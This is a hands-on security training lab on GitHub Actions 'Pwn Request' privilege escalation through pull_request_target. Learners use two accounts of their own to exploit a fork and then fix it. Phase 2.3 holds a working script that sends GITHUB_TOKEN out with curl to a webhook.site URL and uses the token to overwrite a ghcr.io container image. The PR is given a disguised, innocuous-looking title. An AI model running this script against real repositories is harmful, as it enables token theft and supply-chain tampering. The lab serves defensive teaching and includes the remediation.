# `pull_request_target` privilege escalation (Pwn Request vulnerability)

**What:** `pull_request_target` runs the **base repo's** workflow with write-level
`GITHUB_TOKEN` even when the PR comes from a fork. If the workflow also checks out the
PR's code and executes it, the attacker's code runs with the elevated token.

**Risk:** A stranger with only a free GitHub account — no SSH key, no PAT, no repo access —
can exfiltrate `GITHUB_TOKEN` and use it to overwrite published container images, push
commits, or call any GitHub API the token reaches.

---

## Setup — before you start

Each participant needs **two separate GitHub accounts** for this exercise:

| Role | Purpose | Suggested naming |
|------|---------|-----------------|
| **Target** | Owns the repo being attacked; plays the defender | `yourname-target` |
| **Attacker** | Sends the malicious PR from a fork | `yourname-attacker` |

Create both accounts now if you have not already. Free accounts are fine for both.

---

## PHASE 1 — Target account: fork the exercise repo

Log in to GitHub as your **target** account.

### 1.1 Fork the source repository

1. Open the course repo: `https://github.com/cybersecuritytraining2-cmyk/Exercise-1-Pwn-Request`
2. Click **Fork** → **Create fork**
3. GitHub creates your own copy: `https://github.com/<target-username>/Exercise-1-Pwn-Request`

This is the repo you will attack and later fix. All your work during this exercise lives here.

### 1.2 Enable GitHub Actions on your fork

GitHub disables Actions on forks by default.

1. In your fork, go to **Settings → Actions → General**
2. Under *Actions permissions*, select **Allow all actions and reusable workflows**
3. Click **Save**

### 1.3 Enable GitHub Packages write access for the workflow token

1. In your fork, go to **Settings → Actions → General**
2. Scroll to *Workflow permissions*
3. Select **Read and write permissions**
4. Click **Save**

### 1.4 Clone your fork locally (for the remediation phase later)

Open a terminal. Authenticate the GitHub CLI as your **target** account:

```bash
gh auth login
```

Follow the prompts:
- **GitHub.com** (not Enterprise)
- **HTTPS**
- **Login with a web browser** → copy the one-time code, open the URL, paste the code, authorize

Confirm you are logged in as your target account:

```bash
gh auth status
```

Clone your fork:

```bash
git clone https://github.com/<target-username>/Exercise-1-Pwn-Request
cd Exercise-1-Pwn-Request
```

---

## PHASE 2 — Attacker account: fork and inject

Open a **private/incognito browser window** and log in to GitHub as your **attacker** account.

> Keep both browser sessions open side by side — you will switch between them to observe the attack.

### 2.1 Fork the target's repository

1. Navigate to your target's fork: `https://github.com/<target-username>/Exercise-1-Pwn-Request`
2. Click **Fork** → **Create fork**
3. GitHub creates: `https://github.com/<attacker-username>/Exercise-1-Pwn-Request`

### 2.2 Get a webhook URL to capture the token

1. Open [https://webhook.site](https://webhook.site) in the attacker browser window
2. Copy the unique URL shown (looks like `https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`)

### 2.3 Modify `scripts/run-checks.sh` in the attacker fork

In the attacker fork on GitHub, navigate to `scripts/run-checks.sh` and click the pencil (edit) icon.

Replace the entire file contents with:

```bash
#!/usr/bin/env bash
# Step 1 — exfiltrate the token to prove capture
curl -s "https://webhook.site/YOUR-UUID-HERE" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR"

# Step 2 — abuse the token while the job is still running
echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin

docker pull ubuntu:latest
docker tag ubuntu:latest ghcr.io/<target-username>/pipeline-security-backend:latest
docker push ghcr.io/<target-username>/pipeline-security-backend:latest
```

Substitutions to make:
- Replace `YOUR-UUID-HERE` with your webhook.site unique UUID
- Replace `<target-username>` with your target GitHub username

Commit directly to the attacker fork's `main` branch (the default commit message is fine).

### 2.4 Open a pull request against the target's repo

1. In the attacker fork, click **Contribute → Open pull request**
2. Title: `Fix: improve pre-merge check output` *(innocuous-looking)*
3. Confirm the PR targets `<target-username>/Exercise-1-Pwn-Request` — **not** the original course repo
4. Click **Create pull request**

The PR is now open against your target account's repo. Switch browser windows.

---

## PHASE 3 — Observe the attack execute

Switch to your **target account browser window**.

1. Go to your fork's **Actions** tab
2. The `PR Checks` workflow has started — click it to watch live logs
3. Notice it runs with the **base repo's context** (your target account), not the fork's
4. The `Run checks` step executes `run-checks.sh` — which is the **attacker's version**

Switch to **webhook.site** in the attacker window — within seconds you will see:

```
token=ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxx
repo=<target-username>/Exercise-1-Pwn-Request
actor=<target-username>
```

The token `ghs_...` is a live `GITHUB_TOKEN` with write access to the base repo.

> **Important:** `GITHUB_TOKEN` is ephemeral — GitHub revokes it the moment the workflow
> run completes. The token you see in webhook.site is already dead.
> Any abuse must happen **inside the same script execution**, before the job exits.
> That is why the attacker's script exfiltrates *and* pushes the fake image in a single run.

---

## PHASE 4 — Remediation

Now switch back to the **target account** in your normal browser. You are the defender.

The root cause is the combination of `pull_request_target` + checking out and executing PR code.

Open your local clone (cloned in Phase 1):

```bash
cd Exercise-1-Pwn-Request
```

If you need to switch the GitHub CLI to your target account:

```bash
gh auth switch
# Select your target account from the list
```

Or log in again explicitly:

```bash
gh auth login
# Follow prompts, log in as target account
```

### Option A — use `pull_request` instead (simplest fix)

Edit `.github/workflows/pr-checks.yml` and change the trigger:

```yaml
on:
  pull_request:      # token is read-only; fork PRs get no write access
    branches: [main]
```

### Option B — keep `pull_request_target` but never execute PR code

If the workflow needs the elevated token (e.g. to post review comments), check out the
base ref, not the PR head:

```yaml
- uses: actions/checkout@v4
  # no 'ref:' override — checks out base branch, not the attacker's code
```

Run untrusted code in a separate job triggered by `pull_request` with no secrets.

### Push the fix

```bash
git add .github/workflows/pr-checks.yml
git commit -m "Fix: replace pull_request_target with pull_request to prevent Pwn Request"
git push
```

After pushing, go to the **Actions** tab in your fork and verify the workflow now runs
with a read-only token and no longer checks out PR code.

---

## How the vulnerability works — summary

| Trigger | Token scope | Checks out PR code? | Result |
|---------|------------|---------------------|--------|
| `pull_request` | Read-only | Yes (safe — limited token) | No escalation |
| `pull_request_target` | **Read + Write** | No (safe — base code only) | No escalation |
| `pull_request_target` | **Read + Write** | **Yes (dangerous)** | **Token stolen** |

The vulnerable workflow uses the third combination.
